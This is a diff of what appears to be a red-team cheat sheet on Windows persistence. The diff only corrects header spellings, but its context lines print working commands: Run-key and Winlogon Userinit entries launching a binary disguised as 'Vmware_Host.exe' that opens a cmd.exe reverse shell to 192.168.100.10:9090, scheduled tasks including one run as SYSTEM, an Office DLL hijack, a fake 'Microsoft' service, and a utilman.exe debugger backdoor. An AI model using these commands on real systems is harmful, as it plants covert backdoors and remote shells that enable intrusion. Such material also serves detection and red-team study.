@@ -1,6 +1,6 @@
 
 
-### Registry Persistent
+### Registry Persistence
 ```
 #Userland AutoRun Persistence:
 REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\CurrentVersion\Run /v 1 /d "C:\Users\KarMarKhaing\Vmware_Host.exe -e cmd.exe 192.168.100.10 9090"
@@ -16,7 +16,7 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Vmw
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Vmware /t REG_SZ /d "C:\Users\Public\Vmware_Host.exe"
 
 ```
-### Scheduling Persistent 
+### Scheduling Persistence 
 ```
 #Userland Scheduled Task Persistence:
 schtasks /create /tn "Scheduled_Persistence" /tr "cmd.exe /c C:\Users\Public\Vmware_Host.exe" /sc daily /st 18:30
@@ -25,11 +25,11 @@ schtasks /create /tn "Scheduled_Persistence" /tr "cmd.exe /c C:\Users\Public\Vmw
 schtasks /create /ru "SYSTEM" /tn "System_Persistence" /tr "cmd.exe /c C:\Users\Public\Vmware_Host.exe" /sc daily /st 18:36
 ```
 
-### Office Persistent 
+### Office Persistence 
 ```
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\Users\KarMarKhaing\Service.dll
 ```
-### Winlogon Persistent
+### Winlogon Persistence
 ```
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
 
@@ -37,13 +37,13 @@ reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Users\KarMarKhaing\Vmware_Host.exe","C:\Windows\system32\userinit.exe"
 
 ```
-### Services Persistent
+### Services Persistence
 ```
 New-Service -Name "MS_Service for Startups" -BinaryPathName " C:\Users\KarMarKhaing\MS_Startup.exe" -Description "Microsoft Service for Startups"
 
 ```
 
-### Ttand-Alone Persistent
+### Stand-Alone Persistence
 
 ```
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
